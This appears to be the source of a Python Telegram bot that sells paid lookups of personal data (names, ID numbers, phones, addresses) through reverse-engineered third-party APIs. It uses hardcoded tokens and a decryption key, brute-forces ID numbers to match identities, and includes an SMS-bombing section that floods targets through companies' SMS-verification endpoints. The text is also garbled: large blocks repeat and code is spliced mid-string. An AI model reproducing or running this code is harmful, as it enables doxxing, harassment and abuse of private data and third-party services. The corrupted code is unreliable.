import telebot
import requests
import time
import re
import threading
import json
import os
import itertools
import binascii
import random
import concurrent.futures
import inspect  
import sms_list 
from sms_list import *
from Crypto.Cipher import DES3
from datetime import datetime
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ================= 1. 核心配置 =================
API_TOKEN = '8338893180:AAH-l_4m1-tweKyt92bliyk4fsPqoPQWzpU'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'
TOKEN_FILE = 'token.txt'
DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIyNDkyNDYiLCJpYXQiOjE3Mzg1MDMxMTcsImV4cCI6MTczODY3NTkxN30.i9w1G8Y2mU5R5cCI6IkpXVCJ9" 

AUTH_BEARER = "bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IisxOTM3ODg4NDgyNiIsIm9wZW5JZCI6Im95NW8tNHk3Wnd0WGlOaTVHQ3V3YzVVNDZJYk0iLCJpZENhcmRObyI6IjM3MDQ4MTE5ODgwODIwMzUxNCIsInVzZXJOYW1lIjoi6ams5rCR5by6IiwibG9naW5UaW1lIjoxNzY5NDE1NjYxMTk0LCJhcHBJZCI6Ind4ZjVmZDAyZDEwZGJiMjFkMiIsImlzcmVhbG5hbWUiOnRydWUsInNhYXNVc2VySWQiOm51bGwsImNvbXBhbnlJZCI6bnVsbCwiY29tcGFueVZPUyI6bnVsbH0.GwMYvckFHvFbhSi0NXpQDPiv9ZswUBAImN5bUipBla0"

bot = telebot.TeleBot(API_TOKEN)
user_points = {}
CURRENT_X_TOKEN = DEFAULT_TOKEN
user_states = {}
generated_cache = {} 

# --- 数据持久化 ---
def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): float(v) for k, v in data.items()}
        except: pass
    tk = DEFAULT_TOKEN
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content: tk = content
        except: pass
    return pts, tk

user_points, CURRENT_X_TOKEN = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f:
        json.dump({str(k): v for k, v in user_points.items()}, f)

def save_token(new_tk):
    global CURRENT_X_TOKEN
    CURRENT_X_TOKEN = new_tk
    with open(TOKEN_FILE, 'w', encoding='utf-8') as f:
        f.write(new_tk)

# ================= 2. 解密与查询逻辑 =================

def decrypt_data(encrypted_text_hex, key):
    try:
        ciphertext = binascii.unhexlify(encrypted_text_hex)
        key = binascii.unhexlify(key)
        cipher = DES3.new(key, DES3.MODE_ECB)
        decrypted_data = cipher.decrypt(ciphertext)
        try:
            decoded_data = decrypted_data.decode('utf-8', errors='ignore')
            return json.loads(decoded_data)
        except ValueError:
            invalid_chars = [b'\0', b'\x01', b'\x02', b'\x03', b'\x04', b'\x05', b'\x06', b'\x07', b'\x08', b'\x09', b'\x0a', b'\x0b', b'\x0c', b'\x0d', b'\x0e', b'\x0f',
                             b'\x10', b'\x11', b'\x12', b'\x13', b'\x14', b'\x15', b'\x16', b'\x17', b'\x18', b'\x19', b'\x1a', b'\x1b', b'\x1c', b'\x1d', b'\x1e', b'\x1f']
            for char in invalid_chars:
                decrypted_data = decrypted_data.replace(char, b'')
            decoded_data = decrypted_data.decode('utf-8', errors='ignore')
            return json.loads(decoded_data)
    except (binascii.Error, ValueError, json.JSONDecodeError) as e:
        return {"error": str(e)}

# --- 新加：cyh 接口逻辑 ---
def xiaowunb_query_logic(chat_id, id_number, uid):
    base_url = "http://xiaowunb.top/cyh.php"
    params = {"sfz": id_number}
    try:
        response = requests.get(base_url, params=params, timeout=10)
        response.encoding = 'utf-8'
        
        # 扣除 2.5 积分
        user_points[uid] -= 2.5
        save_points()
        
        res_text = response.text if response.text.strip() else "查询结果为空"
        result_message = f"📑 **身份查询结果**\n\n{res_text}\n\n已扣除 **2.5** 积分！\n当前余额: **{user_points[uid]:.2f}**"
        bot.send_message(chat_id, result_message, parse_mode='Markdown')
    except Exception as e:
        bot.send_message(chat_id, f"❌ 接口请求失败: {e}")

def hb_search_logic(chat_id, search_value, uid):
    url = "https://api.91jkj.com/residentshealth"
    headers = {
        "ACTION": "CM019", "LONGITUDE": "114.900015", "SESSION_ID": "7B243BE72768807FD09C55B8763BDBCB",
        "LATITUDE": "26.796795", "Connection": "Keep-Alive", "ORDER_YYFSDM": "1", "SOURCE": "1",
        "isEncrypt": "1", "Content-Type": "application/x-www-form-urlencoded", "Host": "api.91jkj.com",
        "Accept-Encoding": "gzip", "Cookie": "acw_tc=0bd17c6617316858716663239e5577a2ed3657cc2b8ad00f782bcd8f9d741a", "User-Agent": "okhttp/3.14.9"
    }
    try:
        response = requests.post(url, data={"search": search_value}, headers=headers)
        result_json = json.loads(response.text)
        encrypted_text_hex = result_json.get('data')
        if encrypted_text_hex:
            result_data = decrypt_data(encrypted_text_hex, '26556e9bb82743358da7860606b8f29626556e9bb8274335')
            if "error" in result_data:
                bot.send_message(chat_id, result_data["error"])
            elif "page" in result_data and result_data["page"]:
                user_points[uid] -= 3.5
                save_points()
                result_message = "✅查询结果:\n"
                for item in result_data["page"]:
                    result_message += f"姓名:{item['resName']}\n证件:{item['sfcode']}\n手机:{item['mobile']}\n地址:{item['address']}\n\n"
                result_message += f"已扣除 **3.5** 积分！\n当前积分余额：**{user_points[uid]:.2f}** 积分"
                bot.send_message(chat_id, result_message.strip(), parse_mode='Markdown')
            else:
                bot.send_message(chat_id, "查询为空")
        else:
            bot.send_message(chat_id, "响应中data字段为空")
    except:
        bot.send_message(chat_id, "查询接口请求异常")

# ================= 3. 辅助功能 =================

def get_id_check_code(id17):
    factors = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    rem_map = {0: '1', 1: '0', 2: 'X', 3: '9', 4: '8', 5: '7', 6: '6', 7: '5', 8: '4', 9: '3', 10: '2'}
    try:
        sum_val = sum(int(id17[i]) * factors[i] for i in range(17))
        return rem_map[sum_val % 11]
    except: return "X"

def get_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("使用帮助", callback_data="view_help"),
               types.InlineKeyboardButton("在线充值", callback_data="view_pay"))
    return markup

def get_pay_markup():
    admin_url = f"https://t.me/{ADMIN_USERNAME.replace('@', '')}"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("USDT 充值", url=admin_url),
               types.InlineKeyboardButton("OkPay 充值", url=admin_url),
               types.InlineKeyboardButton("RMB 充值", url=admin_url),
               types.InlineKeyboardButton("🔙", callback_data="back_to_main"))
    return markup

def get_help_markup():
    return types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙", callback_data="back_to_main"))

def get_main_text(source, uid, pts):
    first_name = source.from_user.first_name if hasattr(source.from_user, 'first_name') else "User"
    username = f"@{source.from_user.username}" if hasattr(source.from_user, 'username') and source.from_user.username else "未设置"
    return (
        f"Admin@铭\n\n用户 ID: `{uid}`\n用户名称: `{first_name}`\n用户名: {username}\n当前余额: `{pts:.2f}积分`\n\n使用帮助可查看使用教程\n在线充值可支持24小时\n1 USDT = 1 积分"
    )

def get_ui_bar(done, total):
    percent = int(done / total * 100) if total > 0 else 0
    bar_len = 16
    filled = int(bar_len * done // total) if total > 0 else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    return f"⌛ 开始核验...\n[{bar}] {done}/{total} {percent}%"

# ================= 4. 核验逻辑 =================

def single_verify_2ys(chat_id, name, id_card, uid):
    url = "https://api.xhmxb.com/wxma/moblie/wx/v1/realAuthToken"
    headers = {"Authorization": AUTH_BEARER, "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "Referer": "https://servicewechat.com/wxf5fd02d10dbb21d2/59/page-frame.html"}
    try:
        r = requests.post(url, headers=headers, json={"name": name, "idCardNo": id_card}, timeout=10)
        user_points[uid] -= 0.5
        save_points()
        res_type = "二要素核验一致✅" if r.json().get("success") else "二要素验证失败❌"
        res = (f"姓名: **{name}**\n身份证: **{id_card}**\n结果: **{res_type}**\n\n已扣除 **0.5** 积分！\n当前余额：**{user_points[uid]:.2f}**")
    except: res = "❌ 接口请求失败"
    bot.send_message(chat_id, res, parse_mode='Markdown')

def run_batch_task(chat_id, msg_id, name, id_list, uid):
    headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json"}
    total, done = len(id_list), 0
    success_match, is_running = None, True
    lock = threading.Lock()
    def progress_monitor():
        nonlocal done, is_running
        while is_running:
            time.sleep(3)
            with lock: current_done = done
            try: bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=get_ui_bar(current_done, total))
            except: pass
    threading.Thread(target=progress_monitor, daemon=True).start()
    def verify(id_no):
        nonlocal done, success_match, is_running
        if not is_running: return
        try:
            payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=5)
            if r.json().get("code") == 0:
                with lock:
                    if is_running:
                        user_points[uid] -= 2.5; save_points()
                        success_match = (f"✅ **核验成功！**\n\n**{name} {id_no}** 二要素一致\n\n已扣除 **2.5** 积分！\', errors='ignore')
            return json.loads(decoded_data)
        except ValueError:
            invalid_chars = [b'\0', b'\x01', b'\x02', b'\x03', b'\x04', b'\x05', b'\x06', b'\x07', b'\x08', b'\x09', b'\x0a', b'\x0b', b'\x0c', b'\x0d', b'\x0e', b'\x0f',
                             b'\x10', b'\x11', b'\x12', b'\x13', b'\x14', b'\x15', b'\x16', b'\x17', b'\x18', b'\x19', b'\x1a', b'\x1b', b'\x1c', b'\x1d', b'\x1e', b'\x1f']
            for char in invalid_chars:
                decrypted_data = decrypted_data.replace(char, b'')
            decoded_data = decrypted_data.decode('utf-8', errors='ignore')
            return json.loads(decoded_data)
    except (binascii.Error, ValueError, json.JSONDecodeError) as e:
        return {"error": str(e)}

# --- 新加：cyh 接口逻辑 ---
def xiaowunb_query_logic(chat_id, id_number, uid):
    base_url = "http://xiaowunb.top/cyh.php"
    params = {"sfz": id_number}
    try:
        response = requests.get(base_url, params=params, timeout=10)
        response.encoding = 'utf-8'
        
        # 扣除 2.5 积分
        user_points[uid] -= 2.5
        save_points()
        
        res_text = response.text if response.text.strip() else "查询结果为空"
        result_message = f"📑 **身份查询结果**\n\n{res_text}\n\n已扣除 **2.5** 积分！\n当前余额: **{user_points[uid]:.2f}**"
        bot.send_message(chat_id, result_message, parse_mode='Markdown')
    except Exception as e:
        bot.send_message(chat_id, f"❌ 接口请求失败: {e}")

def hb_search_logic(chat_id, search_value, uid):
    url = "https://api.91jkj.com/residentshealth"
    headers = {
        "ACTION": "CM019", "LONGITUDE": "114.900015", "SESSION_ID": "7B243BE72768807FD09C55B8763BDBCB",
        "LATITUDE": "26.796795", "Connection": "Keep-Alive", "ORDER_YYFSDM": "1", "SOURCE": "1",
        "isEncrypt": "1", "Content-Type": "application/x-www-form-urlencoded", "Host": "api.91jkj.com",
        "Accept-Encoding": "gzip", "Cookie": "acw_tc=0bd17c6617316858716663239e5577a2ed3657cc2b8ad00f782bcd8f9d741a", "User-Agent": "okhttp/3.14.9"
    }
    try:
        response = requests.post(url, data={"search": search_value}, headers=headers)
        result_json = json.loads(response.text)
        encrypted_text_hex = result_json.get('data')
        if encrypted_text_hex:
            result_data = decrypt_data(encrypted_text_hex, '26556e9bb82743358da7860606b8f29626556e9bb8274335')
            if "error" in result_data:
                bot.send_message(chat_id, result_data["error"])
            elif "page" in result_data and result_data["page"]:
                user_points[uid] -= 3.5
                save_points()
                result_message = "✅查询结果:\n"
                for item in result_data["page"]:
                    result_message += f"姓名:{item['resName']}\n证件:{item['sfcode']}\n手机:{item['mobile']}\n地址:{item['address']}\n\n"
                result_message += f"已扣除 **3.5** 积分！\n当前积分余额：**{user_points[uid]:.2f}** 积分"
                bot.send_message(chat_id, result_message.strip(), parse_mode='Markdown')
            else:
                bot.send_message(chat_id, "查询为空")
        else:
            bot.send_message(chat_id, "响应中data字段为空")
    except:
        bot.send_message(chat_id, "查询接口请求异常")

# ================= 3. 辅助功能 =================

def get_id_check_code(id17):
    factors = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    rem_map = {0: '1', 1: '0', 2: 'X', 3: '9', 4: '8', 5: '7', 6: '6', 7: '5', 8: '4', 9: '3', 10: '2'}
    try:
        sum_val = sum(int(id17[i]) * factors[i] for i in range(17))
        return rem_map[sum_val % 11]
    except: return "X"

def get_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("使用帮助", callback_data="view_help"),
               types.InlineKeyboardButton("在线充值", callback_data="view_pay"))
    return markup

def get_pay_markup():
    admin_url = f"https://t.me/{ADMIN_USERNAME.replace('@', '')}"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("USDT 充值", url=admin_url),
               types.InlineKeyboardButton("OkPay 充值", url=admin_url),
               types.InlineKeyboardButton("RMB 充值", url=admin_url),
               types.InlineKeyboardButton("🔙", callback_data="back_to_main"))
    return markup

def get_help_markup():
    return types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙", callback_data="back_to_main"))

def get_main_text(source, uid, pts):
    first_name = source.from_user.first_name if hasattr(source.from_user, 'first_name') else "User"
    username = f"@{source.from_user.username}" if hasattr(source.from_user, 'username') and source.from_user.username else "未设置"
    return (
        f"Admin@铭\n\n用户 ID: `{uid}`\n用户名称: `{first_name}`\n用户名: {username}\n当前余额: `{pts:.2f}积分`\n\n使用帮助可查看使用教程\n在线充值可支持24小时\n1 USDT = 1 积分"
    )

def get_ui_bar(done, total):
    percent = int(done / total * 100) if total > 0 else 0
    bar_len = 16
    filled = int(bar_len * done // total) if total > 0 else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    return f"⌛ 开始核验...\n[{bar}] {done}/{total} {percent}%"

# ================= 4. 核验逻辑 =================

def single_verify_2ys(chat_id, name, id_card, uid):
    url = "https://api.xhmxb.com/wxma/moblie/wx/v1/realAuthToken"
    headers = {"Authorization": AUTH_BEARER, "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "Referer": "https://servicewechat.com/wxf5fd02d10dbb21d2/59/page-frame.html"}
    try:
        r = requests.post(url, headers=headers, json={"name": name, "idCardNo": id_card}, timeout=10)
        user_points[uid] -= 0.5
        save_points()
        res_type = "二要素核验一致✅" if r.json().get("success") else "二要素验证失败❌"
        res = (f"姓名: **{name}**\n身份证: **{id_card}**\n结果: **{res_type}**\n\n已扣除 **0.5** 积分！\n当前余额：**{user_points[uid]:.2f}**")
    except: res = "❌ 接口请求失败"
    bot.send_message(chat_id, res, parse_mode='Markdown')

def run_batch_task(chat_id, msg_id, name, id_list, uid):
    headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json"}
    total, done = len(id_list), 0
    success_match, is_running = None, True
    lock = threading.Lock()
    def progress_monitor():
        nonlocal done, is_running
        while is_running:
            time.sleep(3)
            with lock: current_done = done
            try: bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=get_ui_bar(current_done, total))
            except: pass
    threading.Thread(target=progress_monitor, daemon=True).start()
    def verify(id_no):
        nonlocal done, success_match, is_running
        if not is_running: return
        try:
            payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=5)
            if r.json().get("code") == 0:
                with lock:
                    if is_running:
                        user_points[uid] -= 2.5; save_points()
                        success_match = (f"✅ **核验成功！**\n\n**{name} {id_no}** 二要素一致\n\n已扣除 **2.5** 积分！\n当前余额：**{user_points[uid]:.2f}**")
                        is_running = False
        except: pass
        finally:
            with lock: done += 1
    with ThreadPoolExecutor(max_workers=10) as ex: ex.map(verify, id_list)
    is_running = False
    try: bot.delete_message(chat_id, msg_id)
    except: pass
    bot.send_message(chat_id, success_match if success_match else "❌ **未发现匹配结果**", parse_mode='Markdown')

# ================= 5. 短信轰炸 =================

# ============ 新增：新接口函数 ============
import base64
import hashlib
import hmac
import uuid
from urllib.parse import quote
from Crypto.Cipher import AES, DES, DES3, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
import urllib3

urllib3.disable_warnings()

def random_user_agent_new():
    devices = ["SM-G9910", "SM-G9980", "iPhone14,3", "iPhone15,3", "Mi 12", "OPD2404", "RMX2202"]
    android_ver = random.choice(["10", "11", "12", "13", "14", "15"])
    chrome_ver = random.choice(["120.0.6099.109", "125.0.6422.78", "130.0.6723.58", "133.0.6725.153"])
    wechat_ver = random.choice(["8.0.50", "8.0.55", "8.0.61"])
    hex_code = random.choice(["0x28003D34", "0x28003D35", "0x28003D36"])
    return (f"Mozilla/5.0 (Linux; Android {android_ver}; {random.choice(devices)}) "
            f"AppleWebKit/537.36 Chrome/{chrome_ver} Mobile Safari/537.36 "
            f"MicroMessenger/{wechat_ver}({hex_code})")

def make_request_new(url, method="GET", **kwargs):
    try:
        headers = kwargs.pop('headers', {})
        headers.setdefault('User-Agent', random_user_agent_new())
        if method.upper() == "GET":
            resp = requests.get(url, headers=headers, timeout=3, verify=False, **kwargs)
        else:
            resp = requests.post(url, headers=headers, timeout=3, verify=False, **kwargs)
        return resp.status_code == 200
    except:
        return False

def rsa_encrypt_pkcs1(plaintext, public_key_b64):
    try:
        key_bytes = base64.b64decode(public_key_b64)
        rsa_key = RSA.import_key(key_bytes)
        cipher = PKCS1_v1_5.new(rsa_key)
        encrypted = cipher.encrypt(plaintext.encode('utf-8'))
        return base64.b64encode(encrypted).decode('utf-8')
    except:
        return None

# --- 新接口：中梁期货 ---
def zhongliang_futures(phone):
    API_URL = "https://ftoem.10jqka.com.cn:9443/futgwapi/api/oem/v1/thirdPartySms/send"
    RSA_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCoZuhgxGl8g0N7O5AvCFkW8Z/8u7Wrv1QMuNLX/NCMAE3NxfG1/9l1Ql5w2C8KqHxKI/bmpQPDBn4Wsa8qShvYO2fJwKKa7OoM5IzkNkbbxTXxKiECtSrbj9zOowEV6QaqkUtyg3c6pbpyrjHG71QwvxVv2G4sTsnjLdIQZpIyYwIDAQAB"
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    return make_request_new(API_URL, "POST", data={'encryptMobile': encrypted, 'qsId': "750"}, 
        headers={'Host': "ftoem.10jqka.com.cn:9443", 'Content-Type': 'application/x-www-form-urlencoded'})

# --- 新接口：厦门融达 ---
def xiamen_rongda(phone):
    API_URL = "https://rdapp.xmrd.net/gateway/security/code/direct/sms"
    RSA_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmMiLb4dfBkI/alsBJtnAVZZnEGWxPQE0FR2mVtJ4nIFeZ/UyOhjUfTL4N5QWzorkniI8jifvbKARP8f5s3uuVxipkZkjHBytBj7VNv3K8H4LXaP6Jn3fhyULHo1CDnyrXuq9', errors='ignore')
            return json.loads(decoded_data)
        except ValueError:
            invalid_chars = [b'\0', b'\x01', b'\x02', b'\x03', b'\x04', b'\x05', b'\x06', b'\x07', b'\x08', b'\x09', b'\x0a', b'\x0b', b'\x0c', b'\x0d', b'\x0e', b'\x0f',
                             b'\x10', b'\x11', b'\x12', b'\x13', b'\x14', b'\x15', b'\x16', b'\x17', b'\x18', b'\x19', b'\x1a', b'\x1b', b'\x1c', b'\x1d', b'\x1e', b'\x1f']
            for char in invalid_chars:
                decrypted_data = decrypted_data.replace(char, b'')
            decoded_data = decrypted_data.decode('utf-8', errors='ignore')
            return json.loads(decoded_data)
    except (binascii.Error, ValueError, json.JSONDecodeError) as e:
        return {"error": str(e)}

# --- 新加：cyh 接口逻辑 ---
def xiaowunb_query_logic(chat_id, id_number, uid):
    base_url = "http://xiaowunb.top/cyh.php"
    params = {"sfz": id_number}
    try:
        response = requests.get(base_url, params=params, timeout=10)
        response.encoding = 'utf-8'
        
        # 扣除 2.5 积分
        user_points[uid] -= 2.5
        save_points()
        
        res_text = response.text if response.text.strip() else "查询结果为空"
        result_message = f"📑 **身份查询结果**\n\n{res_text}\n\n已扣除 **2.5** 积分！\n当前余额: **{user_points[uid]:.2f}**"
        bot.send_message(chat_id, result_message, parse_mode='Markdown')
    except Exception as e:
        bot.send_message(chat_id, f"❌ 接口请求失败: {e}")

def hb_search_logic(chat_id, search_value, uid):
    url = "https://api.91jkj.com/residentshealth"
    headers = {
        "ACTION": "CM019", "LONGITUDE": "114.900015", "SESSION_ID": "7B243BE72768807FD09C55B8763BDBCB",
        "LATITUDE": "26.796795", "Connection": "Keep-Alive", "ORDER_YYFSDM": "1", "SOURCE": "1",
        "isEncrypt": "1", "Content-Type": "application/x-www-form-urlencoded", "Host": "api.91jkj.com",
        "Accept-Encoding": "gzip", "Cookie": "acw_tc=0bd17c6617316858716663239e5577a2ed3657cc2b8ad00f782bcd8f9d741a", "User-Agent": "okhttp/3.14.9"
    }
    try:
        response = requests.post(url, data={"search": search_value}, headers=headers)
        result_json = json.loads(response.text)
        encrypted_text_hex = result_json.get('data')
        if encrypted_text_hex:
            result_data = decrypt_data(encrypted_text_hex, '26556e9bb82743358da7860606b8f29626556e9bb8274335')
            if "error" in result_data:
                bot.send_message(chat_id, result_data["error"])
            elif "page" in result_data and result_data["page"]:
                user_points[uid] -= 3.5
                save_points()
                result_message = "✅查询结果:\n"
                for item in result_data["page"]:
                    result_message += f"姓名:{item['resName']}\n证件:{item['sfcode']}\n手机:{item['mobile']}\n地址:{item['address']}\n\n"
                result_message += f"已扣除 **3.5** 积分！\n当前积分余额：**{user_points[uid]:.2f}** 积分"
                bot.send_message(chat_id, result_message.strip(), parse_mode='Markdown')
            else:
                bot.send_message(chat_id, "查询为空")
        else:
            bot.send_message(chat_id, "响应中data字段为空")
    except:
        bot.send_message(chat_id, "查询接口请求异常")

# ================= 3. 辅助功能 =================

def get_id_check_code(id17):
    factors = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    rem_map = {0: '1', 1: '0', 2: 'X', 3: '9', 4: '8', 5: '7', 6: '6', 7: '5', 8: '4', 9: '3', 10: '2'}
    try:
        sum_val = sum(int(id17[i]) * factors[i] for i in range(17))
        return rem_map[sum_val % 11]
    except: return "X"

def get_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("使用帮助", callback_data="view_help"),
               types.InlineKeyboardButton("在线充值", callback_data="view_pay"))
    return markup

def get_pay_markup():
    admin_url = f"https://t.me/{ADMIN_USERNAME.replace('@', '')}"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("USDT 充值", url=admin_url),
               types.InlineKeyboardButton("OkPay 充值", url=admin_url),
               types.InlineKeyboardButton("RMB 充值", url=admin_url),
               types.InlineKeyboardButton("🔙", callback_data="back_to_main"))
    return markup

def get_help_markup():
    return types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙", callback_data="back_to_main"))

def get_main_text(source, uid, pts):
    first_name = source.from_user.first_name if hasattr(source.from_user, 'first_name') else "User"
    username = f"@{source.from_user.username}" if hasattr(source.from_user, 'username') and source.from_user.username else "未设置"
    return (
        f"Admin@铭\n\n用户 ID: `{uid}`\n用户名称: `{first_name}`\n用户名: {username}\n当前余额: `{pts:.2f}积分`\n\n使用帮助可查看使用教程\n在线充值可支持24小时\n1 USDT = 1 积分"
    )

def get_ui_bar(done, total):
    percent = int(done / total * 100) if total > 0 else 0
    bar_len = 16
    filled = int(bar_len * done // total) if total > 0 else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    return f"⌛ 开始核验...\n[{bar}] {done}/{total} {percent}%"

# ================= 4. 核验逻辑 =================

def single_verify_2ys(chat_id, name, id_card, uid):
    url = "https://api.xhmxb.com/wxma/moblie/wx/v1/realAuthToken"
    headers = {"Authorization": AUTH_BEARER, "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "Referer": "https://servicewechat.com/wxf5fd02d10dbb21d2/59/page-frame.html"}
    try:
        r = requests.post(url, headers=headers, json={"name": name, "idCardNo": id_card}, timeout=10)
        user_points[uid] -= 0.5
        save_points()
        res_type = "二要素核验一致✅" if r.json().get("success") else "二要素验证失败❌"
        res = (f"姓名: **{name}**\n身份证: **{id_card}**\n结果: **{res_type}**\n\n已扣除 **0.5** 积分！\n当前余额：**{user_points[uid]:.2f}**")
    except: res = "❌ 接口请求失败"
    bot.send_message(chat_id, res, parse_mode='Markdown')

def run_batch_task(chat_id, msg_id, name, id_list, uid):
    headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json"}
    total, done = len(id_list), 0
    success_match, is_running = None, True
    lock = threading.Lock()
    def progress_monitor():
        nonlocal done, is_running
        while is_running:
            time.sleep(3)
            with lock: current_done = done
            try: bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=get_ui_bar(current_done, total))
            except: pass
    threading.Thread(target=progress_monitor, daemon=True).start()
    def verify(id_no):
        nonlocal done, success_match, is_running
        if not is_running: return
        try:
            payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=5)
            if r.json().get("code") == 0:
                with lock:
                    if is_running:
                        user_points[uid] -= 2.5; save_points()
                        success_match = (f"✅ **核验成功！**\n\n**{name} {id_no}** 二要素一致\n\n已扣除 **2.5** 积分！\n当前余额：**{user_points[uid]:.2f}**")
                        is_running = False
        except: pass
        finally:
            with lock: done += 1
    with ThreadPoolExecutor(max_workers=10) as ex: ex.map(verify, id_list)
    is_running = False
    try: bot.delete_message(chat_id, msg_id)
    except: pass
    bot.send_message(chat_id, success_match if success_match else "❌ **未发现匹配结果**", parse_mode='Markdown')

# ================= 5. 短信轰炸 =================

# ============ 新增：新接口函数 ============
import base64
import hashlib
import hmac
import uuid
from urllib.parse import quote
from Crypto.Cipher import AES, DES, DES3, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
import urllib3

urllib3.disable_warnings()

def random_user_agent_new():
    devices = ["SM-G9910", "SM-G9980", "iPhone14,3", "iPhone15,3", "Mi 12", "OPD2404", "RMX2202"]
    android_ver = random.choice(["10", "11", "12", "13", "14", "15"])
    chrome_ver = random.choice(["120.0.6099.109", "125.0.6422.78", "130.0.6723.58", "133.0.6725.153"])
    wechat_ver = random.choice(["8.0.50", "8.0.55", "8.0.61"])
    hex_code = random.choice(["0x28003D34", "0x28003D35", "0x28003D36"])
    return (f"Mozilla/5.0 (Linux; Android {android_ver}; {random.choice(devices)}) "
            f"AppleWebKit/537.36 Chrome/{chrome_ver} Mobile Safari/537.36 "
            f"MicroMessenger/{wechat_ver}({hex_code})")

def make_request_new(url, method="GET", **kwargs):
    try:
        headers = kwargs.pop('headers', {})
        headers.setdefault('User-Agent', random_user_agent_new())
        if method.upper() == "GET":
            resp = requests.get(url, headers=headers, timeout=3, verify=False, **kwargs)
        else:
            resp = requests.post(url, headers=headers, timeout=3, verify=False, **kwargs)
        return resp.status_code == 200
    except:
        return False

def rsa_encrypt_pkcs1(plaintext, public_key_b64):
    try:
        key_bytes = base64.b64decode(public_key_b64)
        rsa_key = RSA.import_key(key_bytes)
        cipher = PKCS1_v1_5.new(rsa_key)
        encrypted = cipher.encrypt(plaintext.encode('utf-8'))
        return base64.b64encode(encrypted).decode('utf-8')
    except:
        return None

# --- 新接口：中梁期货 ---
def zhongliang_futures(phone):
    API_URL = "https://ftoem.10jqka.com.cn:9443/futgwapi/api/oem/v1/thirdPartySms/send"
    RSA_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCoZuhgxGl8g0N7O5AvCFkW8Z/8u7Wrv1QMuNLX/NCMAE3NxfG1/9l1Ql5w2C8KqHxKI/bmpQPDBn4Wsa8qShvYO2fJwKKa7OoM5IzkNkbbxTXxKiECtSrbj9zOowEV6QaqkUtyg3c6pbpyrjHG71QwvxVv2G4sTsnjLdIQZpIyYwIDAQAB"
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    return make_request_new(API_URL, "POST", data={'encryptMobile': encrypted, 'qsId': "750"}, 
        headers={'Host': "ftoem.10jqka.com.cn:9443", 'Content-Type': 'application/x-www-form-urlencoded'})

# --- 新接口：厦门融达 ---
def xiamen_rongda(phone):
    API_URL = "https://rdapp.xmrd.net/gateway/security/code/direct/sms"
    RSA_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmMiLb4dfBkI/alsBJtnAVZZnEGWxPQE0FR2mVtJ4nIFeZ/UyOhjUfTL4N5QWzorkniI8jifvbKARP8f5s3uuVxipkZkjHBytBj7VNv3K8H4LXaP6Jn3fhyULHo1CDnyrXuq9qwuj15ooljcE172JALQ7hfdre1MvPCImFrKw8Vaf/7X1Bsh38Q/J21R+gWkTodhG4QJFs5K5ZDbf2GHueE2HtPKaAQ35cNz8e/6SxUjUFwts8BNPknqUkn5tbcPVIzHCq43xz9iFUglI80XLLe54DnkB967pbweq8lx9qn14dE9L24GexgloMQRvaTtmBvpJ2yVou159lGDBJl+WYwIDAQAB"
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    time.sleep(1)
    return make_request_new(API_URL, "POST", json={"phone": encrypted},
